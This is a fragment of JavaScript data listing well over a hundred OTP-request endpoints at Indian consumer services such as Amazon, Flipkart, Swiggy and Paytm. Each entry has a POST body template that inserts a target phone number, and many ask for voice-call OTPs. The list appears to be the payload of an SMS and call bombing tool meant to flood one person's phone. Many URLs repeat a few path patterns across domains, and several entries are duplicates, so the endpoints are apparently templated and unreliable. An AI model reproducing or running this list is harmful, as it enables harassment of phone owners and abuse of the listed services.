  { 'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Jupiter Call', 'url': 'https://jupiter.money/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Swiggy SMS', 'url': 'https://swiggy.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Nykaa SMS', 'url': 'https://nykaa.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Khatabook SMS', 'url': 'https://khatabook.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Meesho Call', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Flipkart SMS', 'url': 'https://flipkart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': '1Mg Call', 'url': 'https://1mg.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Zepto SMS', 'url': 'https://zepto.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zepto SMS', 'url': 'https://zepto.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Flipkart SMS', 'url': 'https://flipkart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Meesho Call', 'url': 'https://meesho.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': '1Mg WhatsApp', 'url': 'https://1mg.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': '1Mg WhatsApp', 'url': 'https://1mg.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Makemytrip SMS', 'url': 'https://makemytrip.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Zivame SMS', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Uber Call', 'url': 'https://uber.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Paytm Call', 'url': 'https://paytm.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zivame Call', 'url': 'https://zivame.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Zivame Call', 'url': 'https://zivame.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Zepto SMS', 'url': 'https://zepto.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Rapido SMS', 'url': 'https://rapido.bike/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': '1Mg Call', 'url': 'https://1mg.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Nykaa SMS', 'url': 'https://nykaa.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Amazon Call', 'url': 'https://amazon.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Cred Call', 'url': 'https://cred.club/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': '1Mg SMS', 'url': 'https://1mg.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Myntra SMS', 'url': 'https://myntra.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Amazon SMS', 'url': 'https://amazon.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': '1Mg SMS', 'url': 'https://1mg.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zepto SMS', 'url': 'https://zepto.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Rapido Call', 'url': 'https://rapido.bike/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Paytm SMS', 'url': 'https://paytm.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Tatacapital WhatsApp', 'url': 'https://tatacapital.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Api-Gateway WhatsApp', 'url': 'https://api-gateway.juno.lenskart.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Jupiter Call', 'url': 'https://jupiter.money/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Myntra Call', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Uber SMS', 'url': 'https://uber.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Newme SMS', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zivame Call', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Paytm SMS', 'url': 'https://paytm.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Makemytrip SMS', 'url': 'https://makemytrip.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Myntra WhatsApp', 'url': 'https://myntra.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Rapido SMS', 'url': 'https://rapido.bike/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zivame SMS', 'url': 'https://zivame.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Nykaa Call', 'url': 'https://nykaa.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Rapido Call', 'url': 'https://rapido.bike/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': '1Mg Call', 'url': 'https://1mg.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Amazon SMS', 'url': 'https://amazon.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Newme Call', 'url': 'https://newme.asia/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Paytm SMS', 'url': 'https://paytm.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Swiggy SMS', 'url': 'https://swiggy.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Paytm SMS', 'url': 'https://paytm.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Gokwik SMS', 'url': 'https://gokwik.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Oyorooms Call', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Cred WhatsApp', 'url': 'https://cred.club/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Cred WhatsApp', 'url': 'https://cred.club/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Newme SMS', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Flipkart Call', 'url': 'https://flipkart.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
